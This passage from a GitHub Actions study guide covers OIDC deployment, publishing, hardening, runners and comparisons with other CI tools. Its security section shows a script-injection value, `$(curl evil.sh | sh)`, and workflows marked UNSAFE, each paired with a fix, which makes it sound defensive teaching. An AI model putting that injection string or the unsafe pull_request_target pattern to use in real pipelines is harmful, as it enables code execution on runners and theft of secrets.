The single biggest security upgrade for a deploy pipeline: stop storing long-lived cloud keys as secrets. With [OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect), the workflow requests a short-lived, signed **OIDC token** from GitHub that describes the run (repo, branch, environment); your cloud is configured to *trust GitHub's OIDC provider* and exchange that token for short-lived credentials. Nothing long-lived is stored anywhere.

The trust is scoped by the token's claims — above all `sub` (subject), which encodes values like `repo:ORG/REPO:ref:refs/heads/main` or `repo:ORG/REPO:environment:production`. You write a condition that matches exactly the runs you trust. (For the JWT and token-signing background, see the [Cryptography guide](CRYPTO_FUNDAMENTALS.md).)

**AWS, end to end.** First, an IAM role whose trust policy accepts GitHub's OIDC tokens for your repo's `main` branch:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::<ACCOUNT_ID>:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      },
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:<ORG>/<REPO>:ref:refs/heads/main"
      }
    }
  }]
}
```

Then the workflow assumes that role. Note `permissions: id-token: write` — that scope is what lets the run request the OIDC token at all:

```yaml
# .github/workflows/deploy-aws.yml
name: Deploy to AWS
on:
  push:
    branches: [main]
permissions:
  id-token: write      # REQUIRED to request the OIDC token
  contents: read       # least privilege for everything else
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::<ACCOUNT_ID>:role/github-actions-deploy
          aws-region: us-east-1
      - run: aws sts get-caller-identity   # proves the assumed creds work; replace with the real deploy
```

The same pattern covers the other clouds — only the trust setup and the auth action change:

- **Azure** — `azure/login` with a federated credential on an app registration (see the [Azure guide](AZURE_FOR_AWS_SOLUTIONS_ARCHITECT.md)).
- **GCP** — Workload Identity Federation, exchanging the token via `google-github-actions/auth`.
- **Cloudflare** — scoped API tokens, or OIDC where supported (see the [Cloudflare guide](CLOUDFLARE_STUDY_GUIDE.md)).
- **HashiCorp Vault** — Vault's JWT auth method validates the same GitHub OIDC token and returns a short-lived Vault token.

### Deployment Patterns

With credentials solved, the deploy step itself is usually mundane:

- **Container image** → build and push to a registry (next section), then tell your platform to roll it out.
- **Static site** → upload to object storage, a CDN, or Pages.
- **Kubernetes** → `kubectl apply` or a GitOps nudge, authenticating to the cluster's cloud via OIDC. See the [Kubernetes guide](k8s/KUBERNETES_STUDY_GUIDE.md).

Two cross-cutting concerns: gate production behind an `environment:` with a required reviewer, and use `concurrency:` so two deploys can't race (detailed in [Part 8](#part-8--operations-at-scale)):

```yaml
concurrency:
  group: deploy-production       # serialize everything in this group
  cancel-in-progress: false      # let an in-flight deploy finish; queue the next rather than cancel
```

### Release & Publishing Automation

Releases are usually **tag-driven**: pushing a `v*` tag triggers the publish.

**Container image to GHCR** (GitHub's own registry), authenticating with the built-in token — no PAT required:

```yaml
# .github/workflows/publish-image.yml
name: Publish image
on:
  push:
    tags: ['v*']
permissions:
  contents: read
  packages: write              # required to push to GHCR
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.ref_name }}   # ref_name is the tag, e.g. v1.2.0
```

**A Python library to PyPI via trusted publishing** — OIDC again, so there's no API token to store. Register the project as a "trusted publisher" on PyPI, then:

```yaml
# .github/workflows/publish-pypi.yml
name: Publish to PyPI
on:
  push:
    tags: ['v*']
permissions:
  contents: read
  id-token: write              # trusted publishing exchanges an OIDC token, not a stored password
jobs:
  publish:
    runs-on: ubuntu-latest
    environment: pypi            # optional: gate the publish behind an environment
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - run: pip install build && python -m build    # produces dist/*.whl and dist/*.tar.gz
      - uses: pypa/gh-action-pypi-publish@release/v1  # reads the OIDC token; no username/password
```

npm and crates.io follow the same shape: build, then publish with a token in `NODE_AUTH_TOKEN` / `CARGO_REGISTRY_TOKEN` (npm now also supports OIDC trusted publishing). And when you create a GitHub **Release**, it can [auto-generate release notes](https://docs.github.com/en/actions/publishing-packages) from merged PRs — a changelog for free.

---

## Part 7 — Security Hardening

CI/CD is a high-value target: it holds credentials, has write access to your repository, and often the keys to production. This is the part to read twice. The mindset to hold throughout: **treat every workflow as code an attacker will try to influence** — through a malicious pull request, a compromised dependency, or a poisoned action.

### The Threat Model

Concretely, what goes wrong:

- A malicious PR runs code in your CI with access to secrets or a writable token — and exfiltrates secrets, pushes commits, or mints cloud credentials.
- A third-party action you `uses:` is compromised (or was always hostile) — same blast radius, because actions run with **your job's** privileges.
- Untrusted input (a PR title, branch name, issue body) is interpolated into a shell command — arbitrary code execution on the runner.
- A cache or artifact is poisoned in a low-trust context and consumed by a high-trust one.

The rest of this part is the defenses, in priority order.

### `pull_request` vs `pull_request_target` — the Classic Footgun

These two triggers look interchangeable and are anything but:

- **`pull_request`** (from a fork) runs against the PR's merge commit with a **read-only token and no secrets**. Safe by default — a stranger's code cannot touch your secrets. This is what you want for building and testing fork PRs.
- **`pull_request_target`** runs in the context of the **base** repository — **with secrets and a read/write token** — but checks out the base branch's code by default. It exists for trusted tasks like labeling or commenting on PRs.

The footgun is using `pull_request_target` and then checking out and **running the PR's code**. Now untrusted code executes with your secrets and a writable token:

```yaml
# UNSAFE — do not do this
on: pull_request_target            # runs with secrets + a write token
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # checks out UNTRUSTED PR code...
      - run: npm ci && npm run build                        # ...then runs it, with secrets in scope
```

```yaml
# SAFE — build/test fork code under pull_request (no secrets);
# reserve pull_request_target for trusted, code-free tasks only.
on: pull_request                   # read-only token, no secrets — safe to run PR code
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4   # checks out the PR code, but in a powerless context
      - run: npm ci && npm test
```

If you genuinely need secrets for a fork PR (a deploy preview, say), gate it behind an environment with a required reviewer, or move the privileged work into a separate `workflow_run` that never executes the PR's code.

### Script Injection

Anything an outsider controls — PR title, branch name, issue body, commit message — is untrusted. Splicing it straight into a `run:` block is remote code execution:

```yaml
# UNSAFE — do not do this
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

The `${{ }}` is substituted *before* the shell runs, so a PR titled `$(curl evil.sh | sh)` (or wrapped in backticks) executes on your runner. The fix: pass the value in through an environment variable so the shell treats it as **data, never code**:

```yaml
# SAFE
- env:
    TITLE: ${{ github.event.pull_request.title }}   # bound to an env var, not spliced into the script
  run: echo "Title: $TITLE"                          # the shell expands $TITLE as a plain string
```

The same rule applies to any context value derived from user input. When in doubt, route it through `env:`.

### Pin Third-Party Actions to a Commit SHA

`uses: some/action@v3` pins to a **tag**, and tags are **mutable**: whoever controls that action's repo can move `v3` onto new code — including malicious code — and every workflow using `@v3` runs it on the next execution. Pinning to a full 40-character commit SHA removes that power:

```yaml
- uses: actions/checkout@<40-char-commit-sha> # v4   # immutable — a SHA can't be silently repointed
```

The trailing comment keeps it readable. To stop pinned SHAs from going stale, let Dependabot bump them:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

(First-party `actions/*` are lower risk, but the same supply-chain logic applies — SHA-pin anything you don't control.)

### Least Privilege: `permissions`

The automatic `GITHUB_TOKEN` is powerful, so default it to read-only and grant scopes only where needed. Set the org/repo default to restricted in settings, and declare per-workflow and per-job in YAML ([assigning permissions](https://docs.github.com/en/actions/using-jobs/assigning-permissions-to-jobs)):

```yaml
permissions:
  contents: read           # workflow-wide default: read the repo, nothing else
jobs:
  publish:
    permissions:
      contents: read
      packages: write       # only this job can push packages
      id-token: write       # ...and only this job can request an OIDC token
    runs-on: ubuntu-latest
    steps:
      - run: ./publish.sh
```

Declaring any `permissions:` block forces every unlisted scope to `none` — exactly right: start from nothing and add the minimum. (The full scope list is in [automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication).)

### Secrets Exposure and the Supply Chain

Rounding out the defenses ([security hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions), [using secrets](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions)):

- **Don't defeat masking.** Masking catches verbatim secret values; it cannot catch a base64'd or reassembled secret. Never print secrets, and avoid handing them to steps that log verbosely.
- **Forks never receive secrets** (the `pull_request` rule). Don't engineer around it — it is load-bearing.
- **Restrict which actions can run.** Org/repo settings can limit `uses:` to GitHub-authored and verified-creator actions, or an explicit allowlist — a strong supply-chain control.
- **Attest your builds.** `actions/attest-build-provenance` produces signed provenance for your artifacts and images, so downstream consumers can verify what built them.
- **Audit third-party actions** before adopting: read the source at the SHA you pin, prefer verified publishers, and remember that a *transitive* action (one your action depends on) inherits the same access.

---

## Part 8 — Operations at Scale

Hosted runners and the defaults carry you a long way. This part is what changes once you're running thousands of jobs, need special hardware, or have to reach private infrastructure.

### Hosted vs Self-Hosted Runners

GitHub-hosted runners are fresh, fully managed VMs billed per minute. Add or switch to [self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners) when you need:

- special hardware (GPUs, large memory, Apple silicon you control),
- access to a private network (an internal database, an on-prem registry),
- a custom OS or pre-baked image, or
- to control cost at very high volume.

The trade-off: you now own the patching, isolation, and security of those machines.

### Self-Hosted Runners

A self-hosted runner is the runner agent registered to your repo or org. The registration flow (token comes from repo/org settings) is:

```bash
# on the machine that will run jobs
./config.sh --url https://github.com/<ORG>/<REPO> --token <REG_TOKEN> --labels gpu,linux
./run.sh    # start the agent; it polls GitHub for jobs whose runs-on matches its labels
```

Target it from a workflow by label:

```yaml
jobs:
  train:
    runs-on: [self-hosted, gpu]   # matches a runner advertising BOTH labels
```

**The critical caveat:** never attach a self-hosted runner to a **public** repository that accepts fork PRs. A fork's pull request could run arbitrary code on your runner — your hardware, your network, your blast radius. For public repos, stay on hosted runners. And prefer **ephemeral** runners (one job, then deregister) so no state leaks between jobs:

```bash
./config.sh --url https://github.com/<ORG> --token <REG_TOKEN> --ephemeral
```

### Autoscaling with Actions Runner Controller (ARC)

Idle standing runners are wasteful; scaling them by hand is toil. [Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-actions-runner-controller) (ARC) runs runners as pods on Kubernetes and scales them with demand. You install the controller, then a *runner scale set* via Helm:

```yaml
# values.yaml for the gha-runner-scale-set Helm chart (helm install ... -f values.yaml)
githubConfigUrl: https://github.com/<ORG>
githubConfigSecret: arc-github-secret   # holds a GitHub App or PAT used to register runners
minRunners: 0                           # scale to zero when there's no work
maxRunners: 50                          # cap on concurrent runner pods
runnerScaleSetName: linux-arc           # this name becomes the runs-on label
```

```yaml
jobs:
  build:
    runs-on: linux-arc   # the scale-set name is what you target
```

Pods are created on demand and torn down afterward, so you pay only for what runs; this pairs naturally with cluster autoscaling — see the [Kubernetes guide](k8s/KUBERNETES_STUDY_GUIDE.md). If you'd rather not operate ARC, GitHub also sells **larger hosted runners** (more CPU/RAM, optional static IPs) and **runner groups** for access control — the simpler, paid path.

### Concurrency Control

By default every trigger starts a run, so pushes pile up and deploys can race. `concurrency:` groups runs so only one per group is active at a time ([concurrency docs](https://docs.github.com/en/actions/using-jobs/using-concurrency)):

```yaml
# CI: when newer commits arrive on the same branch/PR, cancel the superseded run
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true     # older runs are pointless once newer commits exist — save the minutes
```

```yaml
# Deploy: never cancel a deploy mid-flight; queue the next one instead
concurrency:
  group: deploy-production
  cancel-in-progress: false    # let the running deploy finish, then run the latest queued run
```

The pattern: `cancel-in-progress: true` for CI (only the latest commit matters), `false` for deploys (don't interrupt a half-applied rollout).

### Cost and Optimization

Hosted minutes are free for public repos and included up to a quota for private ones, then billed. Two things to internalize:

- **OS multipliers.** Linux is billed at 1×, but Windows and especially macOS minutes cost a multiple — keep expensive-OS jobs lean.
- **The fastest way to cut the bill is to cut runtime:** cache aggressively (Part 3), right-size matrices (don't run 9 combos when 3 cover the risk), use `paths` filters to skip irrelevant runs, and use `concurrency` to cancel superseded CI. ([Billing reference](https://docs.github.com/en/billing/managing-billing-for-github-actions).)

### Debugging Workflows

When a run misbehaves:

- **Re-run** the whole workflow, or just the failed jobs, from the UI — handy for flaky external dependencies.
- **Step debug logging:** set the repository secret/variable `ACTIONS_STEP_DEBUG` to `true` for verbose runner logs ([enabling debug logging](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging)).
- **Interactive SSH:** drop [`mxschmitt/action-tmate`](https://github.com/mxschmitt/action-tmate) into a workflow to open an SSH session into the live runner and poke around — invaluable for "works locally, fails in CI."
- **Run locally with [`act`](https://github.com/nektos/act):** it executes workflows on your machine in Docker containers. Fidelity isn't perfect (it approximates the hosted images), but the feedback loop beats push-and-wait. Requires Docker — see the [Docker guide](DOCKER_STUDY_GUIDE.md).

---

## Part 9 — Comparison to Alternatives

GitHub Actions isn't the only CI/CD system and isn't always the right one. Here's an honest read on where it sits.

### The Landscape

| Tool | Model | Where it shines | Where Actions wins |
|---|---|---|---|
| **GitLab CI/CD** | YAML pipelines, integrated with GitLab | One platform for repo + CI + registry + security; powerful `rules:`; built-in environments | It's already in GitHub; far larger marketplace of reusable actions |
| **CircleCI** | YAML, SaaS; "orbs" for reuse | Fast, mature caching/parallelism; strong macOS support | No separate SaaS account; tighter GitHub integration; free for public repos |
| **Jenkins** | Self-hosted, Groovy pipelines, plugins | Ultimate flexibility; runs anywhere; vast plugin ecosystem; full on-prem control | No server to run or patch; YAML over Groovy; managed runners |
| **Buildkite** | Hybrid: SaaS control plane, your own agents | Scales massively on your own infra; excellent for big monorepos | Fully hosted option; no agents to manage for the common case |
| **Dagger** | Pipelines as code (Go/Python/etc.), run in containers | Portable — the *same* pipeline runs locally and on any CI; strong caching | Native GitHub integration; no extra engine to learn |

The throughlines: Actions wins on **integration** (it's already in your repo and your PRs) and **ecosystem** (the Marketplace). It loses to Jenkins on raw flexibility and on-prem control, to GitLab on being a single integrated DevOps platform, to Buildkite on very-large-scale self-hosted throughput, and to Dagger on running the identical pipeline off-CI.

### Migrating to Actions

GitHub publishes [migration guides](https://docs.github.com/en/actions/migrating-to-github-actions); the two most common sources:

**From GitLab CI** (`.gitlab-ci.yml` → workflows) — the concepts map cleanly:

| GitLab CI | GitHub Actions |
|---|---|
| `stages:` + `stage:` | `jobs` + `needs:` (build the DAG explicitly) |
| `script:` | `run:` steps |
| `rules:` / `only`/`except` | `on:` filters + `if:` conditions |
| `image:` | a container job (`container:`) or `services:` |
| `artifacts:` / `cache:` | `actions/upload-artifact` / `actions/cache` |
| `include:` | reusable workflows / composite actions |

The main mental shift: GitLab sequences by *stage*; Actions sequences by *explicit `needs` dependencies* — there's no implicit ordering.

**From Jenkins** (`Jenkinsfile` → workflows) — a bigger leap, since you trade imperative Groovy for declarative YAML:

- `stage('X') { ... }` → a job (or a group of steps).
- `agent { ... }` → `runs-on:`.
- Shared libraries → custom/composite actions and reusable workflows.
- Plugins → Marketplace actions (most common plugins have an equivalent; some don't).
- Credentials plugin → secrets + OIDC.

Expect to *redesign* rather than transliterate — Jenkins pipelines often encode logic that belongs in scripts or actions.

### When *Not* to Reach for Actions

The honest misfits:

- **Your source isn't on GitHub** (GitLab, Bitbucket, self-hosted) — use that platform's native CI.
- **You have a large, working Jenkins estate** with deep plugin dependencies — migration cost can outweigh the benefit.
- **You need pipelines that run identically outside any CI** (locally, across multiple vendors) — a portable engine like Dagger fits better.
- **Heavy, long-running, exotic-hardware builds** where you'd self-host everything anyway — Buildkite or Jenkins may model that more naturally.

For most teams already on GitHub, none of these apply, and the integration advantage is decisive.
